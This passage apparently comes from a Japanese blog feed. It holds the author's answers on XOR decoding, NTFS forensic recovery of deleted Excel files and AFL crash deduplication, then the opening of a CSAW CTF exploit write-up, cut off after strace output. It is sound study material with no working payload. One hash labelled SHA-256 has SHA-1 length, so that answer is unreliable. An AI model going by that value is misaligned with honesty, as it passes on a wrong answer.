s         &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; ???C?YMA????UUxY?w5V
decode   -&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt; D1d_y0u_&lt;span class=&quot;synPreProc&quot;&gt;$0&lt;/span&gt;1v3_C0s70m_X0r?
decode*&lt;span class=&quot;synConstant&quot;&gt;2&lt;/span&gt; -&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt; ???C?YMA????UUxY?w5V
$
&lt;/pre&gt;


&lt;p&gt;&lt;br&gt;
3-4.&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0&quot;&gt;アルゴリズム&lt;/a&gt;&lt;br&gt;
　このデコード&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0&quot;&gt;アルゴリズム&lt;/a&gt;はビット列に対してはXORのみを行うだけであるから、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0&quot;&gt;アルゴリズム&lt;/a&gt;とデコード&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0&quot;&gt;アルゴリズム&lt;/a&gt;は同一である。実は最初、デコード終了時のkeyの値を知らなければ、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;するためにデコードの逆操作ができないと思いましたが、XOR暗号と同様に&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;とデコードが同じ操作であるとわかりました。&lt;br&gt;
　次に、この&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0&quot;&gt;アルゴリズム&lt;/a&gt;の考察をする。この&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0&quot;&gt;アルゴリズム&lt;/a&gt;とは別に、単純にkeyを長くしてデータと一度だけ、xorをとる&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0&quot;&gt;アルゴリズム&lt;/a&gt;を考えてみる。その場合、xorをしても変わらなかったビットが複数生じることになり、もし、平文が英語や日本語のような意味のある文であるならば、暗号化後データから平文を直接読み取ることができてしまう。そのため、暗号化を1bitずつ行い、同時にkeyに数学的操作を施すことで、暗号化後データの乱雑さが増すと考えた。&lt;br&gt;&lt;/p&gt;

&lt;h2&gt;問7&lt;/h2&gt;

&lt;p&gt;配布ファイル内の7_sc_spreadsheets.001は、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/NTFS&quot;&gt;NTFS&lt;/a&gt;ボリュームのddイメージファイルです。イメージファイル内には複数の&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/Excel&quot;&gt;Excel&lt;/a&gt;形式のファイルが存在します。以下の問題について、必要であれば解析結果から得られる見解も含めて回答してください。&lt;br&gt;&lt;/p&gt;

&lt;h3&gt;問7-1&lt;/h3&gt;

&lt;p&gt;これらはあるファイルが起点となり、変更が加えられたファイルです。起点となったファイルの入手元を回答してください。&lt;br&gt;
&amp;lt;回答&gt;&lt;br&gt;
&lt;a href=&quot;https://www.kazamiya.net/files/ccba209a4d0c139e1437781932409ccf/Book10.xls&quot;&gt;https://www.kazamiya.net/files/ccba209a4d0c139e1437781932409ccf/Book10.xls&lt;/a&gt;&lt;br&gt;&lt;/p&gt;

&lt;h3&gt;問7-2&lt;/h3&gt;

&lt;p&gt;復元可能なファイルを含めて、全ての&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/Excel&quot;&gt;Excel&lt;/a&gt;ファイルのSHA-256&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%CF%A5%C3%A5%B7%A5%E5%C3%CD&quot;&gt;ハッシュ値&lt;/a&gt;を回答してください。&lt;br&gt;
&amp;lt;回答&gt;&lt;br&gt;
Book10.xls:&lt;br&gt;
15702c89d64e3f7da51d2bd7376b05bf5ecc8e477a2d14221fde6da67c714140&lt;br&gt;
Book10p.xls:&lt;br&gt;
a10eb7e47e08389660781622bd7a7dd5571644ca&lt;br&gt;
Book10m.xls:&lt;br&gt;
12094ea2678d9750e482cd9b3bd2fa924647c4101f7b280a3f9ac0e9a38d7b47&lt;br&gt;
&lt;br&gt;&lt;/p&gt;

&lt;h3&gt;問7-3&lt;/h3&gt;

&lt;p&gt;これらのファイルはどのような順番で、どのような変更が加えられたかを、できるだけ具体的に示してください。&lt;br&gt;
&amp;lt;回答&gt;&lt;br&gt;
3/27 1:02 Book10.xlsがダウンロードされる&lt;br&gt;
3/27 1:04 Book10.xlsを複製してBook10m.xlsを作成&lt;br&gt;
3/27 1:06 Book10m.xlsを削除&lt;br&gt;
3/27 1:07 Book10.xlsを複製してBook10p.xlsを作成&lt;br&gt;
&lt;br&gt;
&amp;lt;解答にあたり勉強したこと&gt;&lt;br&gt;
　&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%D5%A5%A9%A5%EC%A5%F3%A5%B8%A5%C3%A5%AF&quot;&gt;フォレンジック&lt;/a&gt;スの知識は全く持ち合わせていなかったので、とりあえず、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/NTFS&quot;&gt;NTFS&lt;/a&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%D5%A5%A1%A5%A4%A5%EB%A5%B7%A5%B9%A5%C6%A5%E0&quot;&gt;ファイルシステム&lt;/a&gt;のフォーマットについて勉強した。以下のサイトを参考にした。&lt;br&gt;
&lt;a href=&quot;https://www.cse.scu.edu/~tschwarz/coen252_07Fall/Lectures/NTFS.html&quot;&gt;https://www.cse.scu.edu/~tschwarz/coen252_07Fall/Lectures/NTFS.html&lt;/a&gt;&lt;br&gt;
　&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/NTFS&quot;&gt;NTFS&lt;/a&gt;ファイルフォーマットはファイルの集合体である。例えば、内部のファイルとして以下が挙げられる。&lt;br&gt;
$MFT(Master File Table): 保存されたファイルの管理&lt;br&gt;
$LogFile: ログファイル&lt;br&gt;
$Bitmap: どのデータ領域(&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%AF%A5%E9%A5%B9%A5%BF&quot;&gt;クラスタ&lt;/a&gt;ー)が使用されているか&lt;br&gt;
　&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/NTFS&quot;&gt;NTFS&lt;/a&gt;のデータ領域は1KBごとのデータ領域(&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%AF%A5%E9%A5%B9%A5%BF&quot;&gt;クラスタ&lt;/a&gt;ー)に分割されていて、$MFTにて、ファイル名、開始&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%AF%A5%E9%A5%B9%A5%BF&quot;&gt;クラスタ&lt;/a&gt;ー、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%AF%A5%E9%A5%B9%A5%BF&quot;&gt;クラスタ&lt;/a&gt;ーの長さ(すなわち、個々のファイルがどの&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%AF%A5%E9%A5%B9%A5%BF&quot;&gt;クラスタ&lt;/a&gt;ーを占有するか)を定義する。また、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/NTFS&quot;&gt;NTFS&lt;/a&gt;ではタイムスタンプ機能もあり、Created,Accessed,Modified,MFT Entry Modifiedを管理する。ファイルの削除はおそらく、$MFTや$bitmapを書き換えるだけで行われるため、生のデータが&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%AF%A5%E9%A5%B9%A5%BF&quot;&gt;クラスタ&lt;/a&gt;ーに残るものと思われる。MSOfficeには自動保存機能があり、そのために、ファイルの完全削除がされにくいと書かれた文献もあった。&lt;br&gt;
&lt;br&gt;
&amp;lt;回答までの道のり&gt;&lt;br&gt;
&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/NTFS&quot;&gt;NTFS&lt;/a&gt;、ddイメージなどの用語がわからなかったので、検索したところ、これらは&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/windows&quot;&gt;windows&lt;/a&gt;用の&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%D5%A5%A1%A5%A4%A5%EB%A5%B7%A5%B9%A5%C6%A5%E0&quot;&gt;ファイルシステム&lt;/a&gt;のフォーマットだとわかった。&lt;br&gt;
The Sleuth Kitというforensicsのコマンドツールを見つけたので、以下のサイトで一通り学習した。&lt;br&gt;
&lt;a href=&quot;https://qiita.com/iria_piyo/items/8863452c4320f47e7cb3&quot;&gt;https://qiita.com/iria_piyo/items/8863452c4320f47e7cb3&lt;/a&gt;&lt;br&gt;
また、以下の3つのコマンドが有用だった。&lt;br&gt;
fls: イメージ上のファイル名の一覧を取得する&lt;br&gt;
istat: ファイルのタイムスタンプなどを確認する&lt;br&gt;
icat: 指定したファイルの内容を出力する、復元もできる&lt;br&gt;
次に、flsコマンドでイメージ上のファイル一覧を見て、エントリ番号を取得したところ、削除済みファイルであるBook10m.xlsが表示され、istatコマンドで各ファイルのタイムスタンプを見ることができた。そしてicatコマンドで削除済みファイルのデータを、適当なファイルにパイプすると、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/Excel&quot;&gt;Excel&lt;/a&gt;で開くことができた。&lt;br&gt;
また、同時にZone.Identifierというファイルを見つかったので、調べてみたところ、ダウンロード元が書かれているとわかった。この情報は以下のサイトを参考にした。&lt;br&gt;
&lt;a href=&quot;https://ascii.jp/elem/000/001/550/1550399/&quot;&gt;https://ascii.jp/elem/000/001/550/1550399/&lt;/a&gt;&lt;br&gt;
タイムスタンプを確認すると、Book10のCreated,Modifiedは0.1秒ほど違うがほとんど一致することがわかった。また、Book10pも同様であった。Book10mはCreatedの2分後にModifiedされていることがわかり、これらを総合すると、Book10をダウンロードした後に、複製してBook10m、Book10pを順に作ったのだと推測できた。&lt;br&gt;&lt;/p&gt;

&lt;h2&gt;問8&lt;/h2&gt;

&lt;p&gt;ファジングは大量の入力を生成してプログラムを実行、結果を観測しプログラムがクラッシュしたり正常終了しなくなるような入力を発見する手法です。&lt;br&gt;
しかしプログラムが異常な動作をする度に全ての入力を保存しているとキリがありません。例えば「開き括弧&quot;(&quot;に対応する閉じ括弧&quot;)&quot;が無い場合にクラッシュする」ようなバグの場合、
ファザーは&quot;(&quot;, &quot;((&quot;, &quot;(()&quot;.... 等の膨大な数の入力をクラッシュ入力として保存してしまいます。発見された入力が数万個もあるのに蓋を開ければ全て同じ単一のバグを引いていたようでは解析も徒労に終わってしまいます。&lt;br&gt;
&lt;br&gt;
そこでAmerican Fuzzy Lop (AFL)というファザーは独自の&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0&quot;&gt;アルゴリズム&lt;/a&gt;を用いて、同一のバグに対するクラッシュ入力は1つしか保存しないようにしています。&lt;br&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/google/AFL/blob/fab1ca5ed7e3552833a18fc2116d33a9241699bc/afl-fuzz.c#L3302&quot;&gt;https://github.com/google/AFL/blob/fab1ca5ed7e3552833a18fc2116d33a9241699bc/afl-fuzz.c#L3302&lt;/a&gt; &lt;br&gt;&lt;/p&gt;

&lt;p&gt;AFLの&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;を読解し、当該&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0&quot;&gt;アルゴリズム&lt;/a&gt;の概要を「afl-&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/gcc&quot;&gt;gcc&lt;/a&gt;」「エッジ&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%AB%A5%D0%A5%EC%A5%C3%A5%B8&quot;&gt;カバレッジ&lt;/a&gt;」「ビットマップ」という用語を用いて説明してください。&lt;br&gt;
&lt;br&gt;
[解答]&lt;br&gt;
　回答にあたって、わかりやすいように解答を1~6セクションに分割した。当該&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0&quot;&gt;アルゴリズム&lt;/a&gt;を理解する前に、AFLのプログラムの全体像を知る必要がある。よって、AFLの大局的な処理の流れとその実装方法を説明したのち、当該&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0&quot;&gt;アルゴリズム&lt;/a&gt;の概要について解答することにした。第1~5セクションはAFLの&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;と文献などから得られた情報であり、第6セクションは設問に対する回答である。&lt;br&gt;
　英語の情報が多く、ファジングの知識0からのスタートであったので、用語の使い方や自分の理解に自信がないですが、理解できた範囲のことを表現しました。&lt;br&gt;
&lt;br&gt;&lt;/p&gt;

&lt;h4&gt;1.AFLの流れ&lt;br&gt;&lt;/h4&gt;

&lt;p&gt;　まず、AFLの大局的な流れを確認する。&lt;br&gt;
①対象プログラムを&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB&quot;&gt;コンパイル&lt;/a&gt;し、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%BB%A5%F3%A5%D6%A5%EA&quot;&gt;アセンブリ&lt;/a&gt;を生成する。&lt;br&gt;
②コード網羅率を測定するためのコードを&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%BB%A5%F3%A5%D6%A5%EA&quot;&gt;アセンブリ&lt;/a&gt;レベルで埋め込む。&lt;br&gt;
③キューからテストケースを取り出し、対象プログラムを実行して入力する。&lt;br&gt;
④新たな実行経路に到達すれば、入力をキューに加える。&lt;br&gt;
⑤③に戻る。&lt;br&gt;
&lt;br&gt;&lt;/p&gt;

&lt;h4&gt;2. プログラムについて&lt;br&gt;&lt;/h4&gt;

&lt;p&gt;　afl-&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/gcc&quot;&gt;gcc&lt;/a&gt;は&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/gcc&quot;&gt;gcc&lt;/a&gt;/clangのラッパーである。内部ではパラメータを指定して&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/gcc&quot;&gt;gcc&lt;/a&gt;/clangコマンドを実行している。また以下で説明する計測コードの埋め込みはafl-as.cのadd_instruction()関数で行われ、ファジング本体はafl-fuzz.cのfuzz_one()関数で行われる。&lt;br&gt;
&lt;br&gt;&lt;/p&gt;

&lt;h4&gt;3. コード&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%AB%A5%D0%A5%EC%A5%C3%A5%B8&quot;&gt;カバレッジ&lt;/a&gt;の計測&lt;br&gt;&lt;/h4&gt;

&lt;p&gt;3-1. 計測コードとは&lt;br&gt;
計測コード(the instrumentation)はブランチごとに&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%BB%A5%F3%A5%D6%A5%EA&quot;&gt;アセンブリ&lt;/a&gt;レベルで埋め込まれるコードで、コード&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%AB%A5%D0%A5%EC%A5%C3%A5%B8&quot;&gt;カバレッジ&lt;/a&gt;の計測に用いられる。ここで、コード&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%AB%A5%D0%A5%EC%A5%C3%A5%B8&quot;&gt;カバレッジ&lt;/a&gt;とはファジングによって検証された&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;の網羅率の指標である。&lt;br&gt;
&lt;br&gt;
3-2. 計測コードの設置&lt;br&gt;
afl-asでは生成された&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%BB%A5%F3%A5%D6%A5%EA&quot;&gt;アセンブリ&lt;/a&gt;に計測コードを挿入する。計測コードの挿入は主に関数のエントリーポイントや&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/gcc&quot;&gt;gcc&lt;/a&gt;の分岐ラベル、条件分岐に対して行われるが、無条件分岐やnon-brachラベルに対しては行われない。すなわち、関数コール時や、if-elseによる条件分岐時に計測コードが実行されるということである。&lt;br&gt;
&lt;br&gt;
3-3. エッジ&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%AB%A5%D0%A5%EC%A5%C3%A5%B8&quot;&gt;カバレッジ&lt;/a&gt;&lt;br&gt;
　コード&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%AB%A5%D0%A5%EC%A5%C3%A5%B8&quot;&gt;カバレッジ&lt;/a&gt;の計測は到達したコードブロックだけではなく、コードブロック間の遷移を記録することで行われる。計測コードの実体はafl-as.hのtrampoline_fmt32などで定義されている。以下、ブロックAからブロックBへの遷移が行われることを、タプル(A,B)で表すことにすると、(A,B)のヒット数が配列に記録される。そのため、一例として、&lt;br&gt;
A→B→C→D→E&lt;br&gt;
A→B→C→B→A→B→C→D→E&lt;br&gt;
上の二つの制御フローは区別されることになる。実装ではrun_target()関数によって対象プログラムが実行されるのだが、その際に(A,B)に対応する配列trace_bitsの成分に(A,B)のヒット数が格納される。ちなみに、このtrace_bitsは共有メモリであり、setup_shm()によって作成される。また、単&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%BD%E3%B2%BD&quot;&gt;純化&lt;/a&gt;と高速化のために、simplify_trace()によって、配列trace_bitsは大雑把な値で分けられる。この単&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%BD%E3%B2%BD&quot;&gt;純化&lt;/a&gt;には、count_class_lookup8テーブルが参照される。そして、実行後、粒度が荒くなったtrace_bitsはそのテストケースの実行経路を表すことになる。粒度を荒くする理由は、実行経路のわずかな違いを無視するためである。&lt;br&gt;
　それぞれのブロック間の遷移が実行されたかによって評価されるコード&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%AB%A5%D0%A5%EC%A5%C3%A5%B8&quot;&gt;カバレッジ&lt;/a&gt;をエッジ&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%AB%A5%D0%A5%EC%A5%C3%A5%B8&quot;&gt;カバレッジ&lt;/a&gt;といい、これにより、バグの特徴となりやすい異常な制御フローに注目することができる。もちろん、単純なブロック&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%AB%A5%D0%A5%EC%A5%C3%A5%B8&quot;&gt;カバレッジ&lt;/a&gt;では制御フローを追うことはできない。&lt;br&gt;
&lt;br&gt;&lt;/p&gt;

&lt;h4&gt;4. ビットマップ&lt;br&gt;&lt;/h4&gt;

&lt;p&gt;　ここではAFLのファジングに利用されるビットマップについて解説する。&lt;br&gt;
&lt;br&gt;
4-1.ビットマップの種類&lt;br&gt;
virgin_bits : &lt;br&gt;
　未到達のコード域を記録するビットマップである。&lt;br&gt;
virgin_tmout : &lt;br&gt;
　&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%BF%A5%A4%A5%E0%A5%A2%A5%A6%A5%C8&quot;&gt;タイムアウト&lt;/a&gt;したことがないかを記録するビットマップである。&lt;br&gt;
virgin_crash : &lt;br&gt;
　クラッシュしたことがないかを記録するビットマップである。&lt;br&gt;
&lt;br&gt;
4-2.ビットマップの利用&lt;br&gt;
　これら3つのビットマップは3-3のtrace_bitsと同じく、タプル(A,B)によってランダムアクセスされる。save_if_interesting()関数では、3-1で示したビットマップで新たなビットが立った場合、テストケースがキューに保持され、そうでない場合はテストケースは破棄される。&lt;br&gt;
&lt;br&gt;&lt;/p&gt;

&lt;h4&gt;5. fuzz_one()関数の流れ&lt;br&gt;&lt;/h4&gt;

&lt;p&gt;　最後に、ファジング本体の処理を確認する。&lt;br&gt;
①Calibration:&lt;br&gt;
　内部で関数run_target()を呼び出し、主にプログラムの実行とコード&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%AB%A5%D0%A5%EC%A5%C3%A5%B8&quot;&gt;カバレッジ&lt;/a&gt;の測定を行う。&lt;br&gt;
②テストケースのトリミング : &lt;br&gt;
　高速化とバグを引き起こす入力の特徴抽出のためにテストケースを最小化する。&lt;br&gt;
③テストケースの評価 : &lt;br&gt;
　(実行時間)*(入力サイズ)によって、テストケースを評価する。以降、好ましいテストケースはキューから取り出されやすくなる。これは、たくさんのテストケースを用いるよりもテストケースを絞った方が効率がいいからである。&lt;br&gt;
④テストケースの変異: &lt;br&gt;
simple bitflip, arithmetic inc/dec, interesting values, dictionary stuff, random havoc, splicingなどの手法で行われる。&lt;br&gt;
&lt;br&gt;&lt;/p&gt;

&lt;h4&gt;6. 設問に対する解答&lt;br&gt;&lt;/h4&gt;

&lt;p&gt;　以上をふまえて、AFLにおける、同一バグに対するクラッシュ入力を1つにする&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0&quot;&gt;アルゴリズム&lt;/a&gt;を簡潔に説明する。対象プログラムは&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/gcc&quot;&gt;gcc&lt;/a&gt;のラッパーであるafl-&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/gcc&quot;&gt;gcc&lt;/a&gt;によって&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB&quot;&gt;コンパイル&lt;/a&gt;され、afl-asでコードブロックごとにエッジ&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%AB%A5%D0%A5%EC%A5%C3%A5%B8&quot;&gt;カバレッジ&lt;/a&gt;計測用のコードが埋め込まれる。初期テストケースはキューに保存され、ファジング本体であるfuzz_one()においてキューから一つ取り出される。対象プログラム実行時に、3-3で示したようにタプル(A,B)に対応するtrace_bitsのビットが立つ。未走査パスやクラッシュしたパスを記録したビットマップとtrace_bitsを比較することで、新たな実行経路においてクラッシュが発生したかどうかがわかる。そのような場合にのみ、テストケースをキューに追加する。以上の&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0&quot;&gt;アルゴリズム&lt;/a&gt;によって、よりエッジ&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%AB%A5%D0%A5%EC%A5%C3%A5%B8&quot;&gt;カバレッジ&lt;/a&gt;の高いテストケースのみが生成されることになる。すなわち、同一のバグに対するクラッシュ入力は重複しない。&lt;br&gt;
&lt;br&gt;
おしまい&lt;/p&gt;
</description>          <pubDate>Sun, 13 Jun 2021 21:10:01 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/26006613775522131</guid>
          
            <category>イベント</category>
          
          <enclosure url="https://ogimage.blog.st-hatena.com/26006613542645241/26006613775522131/1638952805" type="image/png" length="0" />
        </item>
      
    
      
      
        <item>
          <title>CSAW CTF 2013 exploit200 [writeup]</title>
          <link>https://tamaron.hatenablog.com/entry/2020/05/28/211231</link>          <description>&lt;p&gt;問題バイナリ
&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=http%3A%2F%2Fshell-storm.org%2Frepo%2FCTF%2FCSAW-2013%2FExploitation%2FExploitation-2-200%2F&quot; title=&quot;shell-storm | Repository&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;http://shell-storm.org/repo/CTF/CSAW-2013/Exploitation/Exploitation-2-200/&quot;&gt;shell-storm.org&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;まずバイナリを実行してみると、何も表示されず動作が全くわからなかった。
いわゆるfork-server型の問題、初めてだったので他の方のサイトを参考にして進めた。&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;$ strace ./exploit2&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;を実行して&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B7%A5%B9%A5%C6%A5%E0%A5%B3%A1%BC%A5%EB&quot;&gt;システムコール&lt;/a&gt;を追うことができる。&lt;/p&gt;

&lt;p&gt;starce結果&lt;/p&gt;

&lt;pre class=&quot;code lang-sh&quot; data-lang=&quot;sh&quot; data-unlink&gt;&lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;中略&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt;
socket&lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;AF_INET, SOCK_STREAM, IPPROTO_TCP&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;3&lt;/span&gt;
setsockopt&lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;, SOL_SOCKET, SO_REUSEADDR, [&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;], &lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;synStatement&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;, {&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;sa_family&lt;/span&gt;=&lt;span class=&quot;synSpecial&quot;&gt;AF_INET, &lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;sin_port&lt;/span&gt;=&lt;span class=&quot;synSpecial&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;31338&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;, &lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;sin_addr&lt;/span&gt;=&lt;span class=&quot;synSpecial&quot;&gt;inet_addr&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;0.0.0.0&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;}, &lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;16&lt;/span&gt;&lt;span 